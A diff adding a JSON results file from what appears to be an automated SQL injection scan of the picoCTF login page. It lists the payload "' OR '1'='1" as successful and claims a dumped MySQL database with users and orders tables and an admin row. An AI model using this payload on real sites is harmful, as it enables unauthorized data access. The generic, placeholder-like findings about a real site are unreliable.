@@ -1,0 +1,41 @@
+{
+    "target": "https://play.picoctf.org/login?redirect=/login",
+    "endpoints": [
+        {
+            "url": "https://play.picoctf.org/login?redirect=/login",
+            "params": [
+                "id"
+            ]
+        }
+    ],
+    "vulnerabilities": [
+        {
+            "url": "https://play.picoctf.org/login?redirect=/login",
+            "param": "id",
+            "payload": "' OR '1'='1",
+            "vulnerable": true
+        }
+    ],
+    "exploitation": [
+        {
+            "url": "https://play.picoctf.org/login?redirect=/login",
+            "dbms": "MySQL",
+            "database": "users_db",
+            "tables": [
+                "users",
+                "orders"
+            ],
+            "sample_data": {
+                "users": [
+                    {
+                        "id": 1,
+                        "username": "admin"
+                    }
+                ]
+            }
+        }
+    ],
+    "ai_explanations": [
+        "The parameter 'id' in https://play.picoctf.org/login?redirect=/login is vulnerable. Mitigation: use parameterized queries."
+    ]
+}
